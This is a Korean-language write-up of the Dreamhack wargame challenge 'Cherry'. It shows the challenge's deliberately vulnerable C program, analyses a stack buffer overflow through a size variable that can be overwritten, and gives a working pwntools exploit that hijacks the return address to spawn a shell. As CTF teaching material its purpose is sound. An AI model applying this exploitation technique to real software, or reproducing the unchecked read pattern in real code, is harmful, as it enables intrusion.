# Cherry

[문제 링크](https://dreamhack.io/wargame/challenges/959)

## 문제 분석

```c
// Compile: gcc -fno-stack-protector -no-pie chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void flag() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}

int main(int argc, char *argv[]) {
    int stdin_fd = 0;
    int stdout_fd = 1;
    char fruit[0x6] = "cherry";
    int buf_size = 0x10;
    char buf[0x6];

    initialize();

    write(stdout_fd, "Menu: ", 6);
    read(stdin_fd, buf, buf_size);
    if(!strncmp(buf, "cherry", 6)) {
        write(stdout_fd, "Is it cherry?: ", 15);
        read(stdin_fd, fruit, buf_size);
    }

    return 0;
}
```

문제의 컴파일 옵션을 보면 카나리 및 PIE가 꺼져있고, 쉘을 실행시킬 수 있는 flag 함수가 존재하는 것을 볼때 RET를 flag의 주소로 변조하면 풀 수 있을 것 같다.

## 취약점 분석

buf의 사이즈는 0x6이지만 입력 받는 buf의 사이즈는 0x10이다. 이를 통해 스택 버퍼 오버플로우를 발생시킬 수 있을 것이다.

## 익스플로잇 구상

메모리 구조를 살펴보면 다음과 같다.

```
rbp + 0x8 | RET
rbp - 0x4 | stdin_fd
rbp - 0x8 | stdout_fd
rbp - 0xc | buf_size [0x4]
rbp - 0x12 | fruit [0x6]
rbp - 0x18 | buf [0x6]
```

buf위치 부터 0x10만큼 작성할 수 있기 때문에 buf_size까지 값을 덮을 수 있다. 이를 통해 buf_size를 충분히 늘린 다음 추후 fruit에 값을 입력할때 늘려진 buf_size를 이용해서 RET를 변조할 수 있을 것이다.

## 익스플로잇 코드

```python
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], sys.argv[2])
else :
    p = process('./chall')

context.arch = 'amd64'
e = ELF('./chall')
flag_addr = e.sym['flag']

payload = b'cherry'
payload = payload.ljust(6, b'\x00')
payload += p64(0x100)

p.sendlineafter(b"Menu: ", payload)

payload = b'A' * 0x1a
payload += p64(flag_addr)

p.sendlineafter(b'?: ', payload)
p.interactive()
```